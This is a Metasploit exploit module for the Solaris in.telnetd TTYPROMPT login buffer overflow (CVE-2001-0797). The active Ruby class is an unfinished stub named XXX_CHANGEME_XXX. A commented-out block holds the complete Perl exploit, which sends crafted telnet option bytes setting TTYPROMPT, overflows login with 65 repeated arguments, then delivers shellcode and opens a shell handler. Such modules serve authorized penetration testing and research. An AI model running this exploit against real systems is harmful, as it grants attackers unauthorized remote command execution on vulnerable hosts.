require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Solaris in.telnetd TTYPROMPT Buffer Overflow',
			'Description'    => %q{
				A buffer overflow in 'login' of various System V based
				operating systems allows remote attackers to execute
				arbitrary commands via a large number of arguments through
				services such as telnet and rlogin.
					
			},
			'Author'         => [ 'y0@w00t-shell.net' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'BID', '5531'],
					[ 'CVE', '2001-0797'],
					[ 'MIL', '66'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'solaris',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Jan 18 2002',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_ttyprompt;
use base "Msf::Exploit";
use strict;

my $advanced = { };
my $info =
  {
	'Name'		=> 'Solaris in.telnetd TTYPROMPT Buffer Overflow',
	'Version'	=> '$Revision$',
	'Authors'	=> [ 'y0 [at] w00t-shell.net', ],

	'Arch'		=> [  ],
	'OS'		=> [ 'solaris' ],
	'Priv'		=> 0,

	'Payload'	=>
	  {
		'Space' => 2000,
		'Keys'	=> ['cmd_interact'],
	  },

	'UserOpts'	=>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 23],
		'USER'  => [1, 'DATA', 'Default username', 'bin'],
	  },

	'Description' => Pex::Text::Freeform(qq{
		A buffer overflow in 'login' of various System V based operating
		systems allows remote attackers to execute arbitrary commands via
		a large number of arguments through services such as telnet and 
		rlogin.  
}),

	'Refs'	=>
	  [
		['BID', '5531'],
		['CVE', '2001-0797'],
		['MIL', '66'],
	  ],

	'DefaultTarget'	=> 0,

	'Targets'	=> [['No Target Needed']],
	'Keys'		=> ['telnet'],

	'DisclosureDate' => 'Jan 18 2002',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $shellcode   = $self->GetVar('EncodedPayload')->RawPayload;
	my $user        = $self->GetVar('USER');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine("[*] Connection failed: ".$s->GetError);
		return;
	}

	$self->PrintLine(sprintf("[*] Setting TTYPROMPT ..."));

	my $cruft ="\xff\xfc\x18"
	  ."\xff\xfc\x1f"
	  ."\xff\xfc\x21"
	  ."\xff\xfc\x23"
	  ."\xff\xfb\x22"
	  ."\xff\xfc\x24"
	  ."\xff\xfb\x27"
	  ."\xff\xfb\x00"
	  ."\xff\xfa\x27\x00"
	  ."\x00\x54\x54\x59\x50\x52\x4f\x4d\x50\x54"
	  ."\x01\x61\x62\x63\x64\x65\x66"
	  ."\xff\xf0";

	$self->PrintLine(sprintf("[*] Setting user '$user' with 65 chars ..."));
	my $overflow = $user . (" M" x 65) . "\n";

	$self->PrintLine(sprintf("[*] Wait for shell ..."));

	$s->Send($cruft);
	$s->Send($overflow);
	$s->Send($shellcode . "\n");
	$self->Handler($s);
	return;
};

1;

=end


end
end	
